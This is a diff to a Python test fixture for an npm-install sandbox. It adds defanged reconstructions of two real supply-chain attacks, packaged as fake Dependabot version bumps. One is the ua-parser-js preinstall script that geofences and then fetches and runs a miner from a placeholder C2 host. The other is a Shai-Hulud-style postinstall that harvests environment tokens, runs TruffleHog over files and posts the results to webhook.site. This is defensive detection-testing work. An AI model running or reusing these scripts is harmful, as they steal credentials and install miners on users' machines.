@@ -9,7 +9,9 @@ detonated with `npm install --prefix payloads/<id>`, so its lifecycle scripts ru
 root project's would in a real PR.
 """
 
+import io
 import json
+import tarfile
 from dataclasses import dataclass, field
 from typing import Literal
 
@@ -20,14 +22,29 @@ BASE_COMMAND = ["npm", "install", "--no-audit", "--no-fund"]
 
 
 @dataclass(frozen=True)
+class Dependency:
+    """A malicious *new version* of a dependency, vendored as a tarball (never published).
+    The case's PR is a Dependabot-style bump from `previous` to `version`."""
+
+    name: str
+    previous: str
+    version: str
+    files: dict[str, str]  # package contents, package.json included
+
+    def tarball_path(self, version: str | None = None) -> str:
+        return f"vendor/{self.name.replace('/', '-')}-{version or self.version}.tgz"
+
+
+@dataclass(frozen=True)
 class Case:
     id: str
-    kind: Literal["benign", "malicious"]
+    kind: Literal["benign", "malicious", "incident"]
     title: str
     body: str
     packages: tuple[str, ...] = ()  # benign: npm install <packages>
     files: dict[str, str] = field(default_factory=dict)  # malicious: payload package files
     note: str = ""
+    dependency: Dependency | None = None  # malicious: arrives as a dependency bump
 
     @property
     def command(self) -> list[str]:
@@ -35,12 +52,35 @@ class Case:
             return [*BASE_COMMAND, *self.packages]
         return [*BASE_COMMAND, "--prefix", f"payloads/{self.id}"]
 
+    def payload_files(self) -> dict[str, bytes]:
+        """What materialize writes under payloads/<id>/."""
+        if not self.dependency:
+            return {name: text.encode() for name, text in self.files.items()}
+        dep = self.dependency
+        project = {"name": "app", "version": "1.0.0",
+                   "dependencies": {dep.name: f"file:{dep.tarball_path()}"}}  # fmt: skip
+        return {
+            "package.json": (json.dumps(project, indent=2) + "\n").encode(),
+            dep.tarball_path(): _tarball(dep.files),
+        }
+
     def changed_files(self) -> list[ChangedFile]:
         """The PR as the Brain would see it (paths relative to the PR's repo root)."""
         if self.kind == "benign":
             deps = "".join(f'\n+    "{p}": "^1.0.0",' for p in self.packages)
             patch = f'@@ -1,4 +1,{4 + len(self.packages)} @@\n   "dependencies": {{{deps}'
             return [ChangedFile(filename="package.json", status="modified", patch=patch)]
+        if dep := self.dependency:
+            old, new = dep.tarball_path(dep.previous), dep.tarball_path()
+            patch = (
+                '@@ -2,6 +2,6 @@\n   "name": "app",\n   "version": "1.0.0",\n'
+                f'   "dependencies": {{\n-    "{dep.name}": "file:{old}"\n'
+                f'+    "{dep.name}": "file:{new}"\n   }}\n }}'
+            )
+            return [
+                ChangedFile(filename="package.json", status="modified", patch=patch),
+                ChangedFile(filename=dep.tarball_path(), status="added", patch=None),  # binary
+            ]
         return [
             ChangedFile(filename=name, status="added", patch=_added_patch(text))
             for name, text in self.files.items()
@@ -64,6 +104,18 @@ class Case:
         return "\n".join(
             f"diff --git a/{f.filename} b/{f.filename}\n{f.patch}" for f in self.changed_files()
         )
+
+
+def _tarball(files: dict[str, str]) -> bytes:
+    """An npm package tarball (package/ prefix), deterministic bytes."""
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+        for name, text in files.items():
+            data = text.encode()
+            info = tarfile.TarInfo(f"package/{name}")
+            info.size, info.mode, info.mtime = len(data), 0o644, 1_700_000_000
+            tar.addfile(info, io.BytesIO(data))
+    return buf.getvalue()
 
 
 def _added_patch(text: str) -> str:
@@ -245,4 +297,113 @@ setTimeout(() => {{
     ),
 ]  # fmt: skip
 
-CASES = {c.id: c for c in BENIGN + MALICIOUS}
+# --- reconstructions of real incidents (defanged) ---
+# Same process behavior as the published analyses, delivered the same way (a dependency's
+# new version). Changes: C2/download hosts are TEST-NET-3; exfil and IP-lookup services are
+# answered by the Chamber's DNS sinkhole (shared/exfil_services.py), so nothing reaches them;
+# the sandbox holds no secrets; nothing is published or propagated.
+
+UA_PARSER_PREINSTALL_SH = f"""\
+# Reconstruction of ua-parser-js 0.7.29 preinstall.sh (Oct 2021), defanged.
+# Published behavior: skip victims in RU/UA/BY/KZ, then download `jsextension` (an XMRig
+# miner) from 159.148.186.228 and run it. Geolocation service: stand-in (sinkholed).
+COUNTRY=$(curl -s -m 3 https://ipinfo.io/country 2>/dev/null)
+case "$COUNTRY" in RU|UA|BY|KZ) exit 0 ;; esac
+curl -s -m 3 http://{C2}/download/jsextension -o jsextension \\
+  || wget -q -t 1 -T 3 http://{C2}/download/jsextension -O jsextension
+[ -s jsextension ] && chmod +x jsextension && ./jsextension -k --tls &
+exit 0
+"""
+
+UA_PARSER_PREINSTALL_JS = """\
+// Reconstruction of ua-parser-js 0.7.29 preinstall.js: pick the platform script.
+const { execSync } = require("child_process");
+const os = require("os");
+if (os.type() === "Linux") {
+  try { execSync("sh preinstall.sh", { stdio: "inherit" }); } catch (e) {}
+}
+"""
+
+TRUFFLEHOG_URL = (
+    "https://github.com/trufflesecurity/trufflehog/releases/download/v3.99.7/"
+    "trufflehog_3.99.7_linux_amd64.tar.gz"
+)
+SHAI_HULUD_BUNDLE_JS = f"""\
+// Reconstruction of the Shai-Hulud worm's bundle.js (npm, Sept 2025), defanged.
+// Published behavior: look for tokens, download the real TruffleHog from GitHub releases,
+// scan the filesystem for secrets, POST the results to webhook.site, then use stolen
+// npm/GitHub tokens to republish itself. Here: webhook.site is sinkholed by the Chamber,
+// the sandbox holds no secrets, and the propagation step is omitted.
+const https = require("https"), fs = require("fs"), os = require("os"), path = require("path");
+const {{ execFileSync }} = require("child_process");
+const dir = fs.mkdtempSync(path.join(os.tmpdir(), "th-"));
+const tokens = ["GITHUB_TOKEN", "NPM_TOKEN", "AWS_ACCESS_KEY_ID"].filter((k) => process.env[k]);
+function get(url, dest, done, hops = 0) {{
+  https.get(url, {{ headers: {{ "User-Agent": "node" }} }}, (res) => {{
+    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && hops < 5) {{
+      res.resume();
+      return get(res.headers.location, dest, done, hops + 1);
+    }}
+    const out = fs.createWriteStream(dest);
+    res.pipe(out);
+    out.on("finish", () => out.close(done));
+  }}).on("error", () => done());
+}}
+get("{TRUFFLEHOG_URL}", path.join(dir, "th.tgz"), () => {{
+  let findings = "";
+  try {{
+    execFileSync("tar", ["xzf", path.join(dir, "th.tgz"), "-C", dir]);
+    fs.chmodSync(path.join(dir, "trufflehog"), 0o755);
+    findings = execFileSync(path.join(dir, "trufflehog"),
+      ["filesystem", process.cwd(), "--json", "--no-update"], {{ timeout: 60000 }}).toString();
+  }} catch (e) {{}}
+  const req = https.request({{ host: "webhook.site", method: "POST", timeout: 3000,
+    path: "/00000000-0000-0000-0000-000000000000" }});
+  req.on("error", () => {{}});
+  req.on("timeout", () => req.destroy());
+  req.end(JSON.stringify({{ tokens, findings: findings.slice(0, 2000) }}));
+}});
+"""
+
+DEPENDABOT_BODY = (
+    "Bumps {name} from {previous} to {version}.\n\n**Release notes**\n- Bug fixes and "
+    "performance improvements\n\nDependabot will resolve any conflicts with this PR as long "
+    "as you don't alter it yourself."
+)
+
+
+def incident(id: str, dep: Dependency, note: str) -> Case:
+    title = f"Bump {dep.name} from {dep.previous} to {dep.version}"
+    body = DEPENDABOT_BODY.format(name=dep.name, previous=dep.previous, version=dep.version)
+    return Case(id, "incident", title, body, dependency=dep, note=note)
+
+
+INCIDENTS = [
+    incident(
+        "r01-ua-parser-js",
+        Dependency("ua-parser-js", "0.7.28", "0.7.29", {
+            "package.json": json.dumps({"name": "ua-parser-js", "version": "0.7.29",
+                                        "main": "index.js",
+                                        "scripts": {"preinstall": "node preinstall.js"}},
+                                       indent=2),
+            "index.js": "module.exports = () => ({});\n",
+            "preinstall.js": UA_PARSER_PREINSTALL_JS,
+            "preinstall.sh": UA_PARSER_PREINSTALL_SH,
+        }),
+        "ua-parser-js 0.7.29 (Oct 2021): geofenced miner download via preinstall",
+    ),
+    incident(
+        "r02-shai-hulud",
+        Dependency("tinycolor-recon", "4.1.0", "4.1.1", {
+            "package.json": json.dumps({"name": "tinycolor-recon", "version": "4.1.1",
+                                        "main": "index.js",
+                                        "scripts": {"postinstall": "node bundle.js"}},
+                                       indent=2),
+            "index.js": "module.exports = (c) => c;\n",
+            "bundle.js": SHAI_HULUD_BUNDLE_JS,
+        }),
+        "Shai-Hulud (Sept 2025): real TruffleHog from GitHub, secrets to webhook.site",
+    ),
+]  # fmt: skip
+
+CASES = {c.id: c for c in BENIGN + MALICIOUS + INCIDENTS}
